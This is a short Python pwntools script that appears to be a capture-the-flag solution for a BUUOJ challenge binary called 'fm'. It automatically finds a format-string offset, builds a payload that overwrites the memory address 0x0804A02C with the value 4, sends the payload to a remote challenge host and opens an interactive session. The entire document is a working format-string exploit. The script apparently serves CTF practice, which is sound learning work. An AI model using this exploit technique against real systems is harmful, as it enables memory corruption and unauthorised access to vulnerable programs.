from pwn import *

p = remote("node4.buuoj.cn", 26304)
#p = process("./fm")

def trigger_fmt(payload):
    p = process("./fm")
    p.send(payload)
    return p.recv()

auto_fmt = FmtStr(trigger_fmt)
writes = {0x0804A02C:4}
payload = fmtstr_payload(auto_fmt.offset, writes)
print(auto_fmt.offset)
print(payload)
p.send(payload)
p.interactive()